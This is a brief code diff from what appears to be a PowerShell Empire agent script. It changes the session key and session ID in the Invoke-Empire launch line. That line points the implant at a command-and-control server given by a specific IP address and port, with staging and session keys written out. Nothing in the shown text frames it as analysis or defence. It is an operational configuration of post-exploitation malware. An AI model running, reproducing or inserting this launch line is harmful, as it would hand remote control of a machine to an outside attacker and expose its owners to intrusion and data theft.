@@ -987,4 +987,4 @@ function Invoke-Empire {
     }
 }
 
-Invoke-Empire -Servers @('http://139.180.171.110:22161') -StagingKey 'Dwf<aIHl*J@4W2?OmehLQCG5;1A!RTo~' -SessionKey '\k3C.gH+<zFMp$%t0fhlbYj#_EmAUSa^' -SessionID 'SMWBG3A7' -WorkingHours '' -KillDate '';
+Invoke-Empire -Servers @('http://139.180.171.110:22161') -StagingKey 'Dwf<aIHl*J@4W2?OmehLQCG5;1A!RTo~' -SessionKey 'e|{^P9o<%AJI`L7NZ?>[6\0t#q5v~uGl' -SessionID 'DRPC9N2M' -WorkingHours '' -KillDate '';
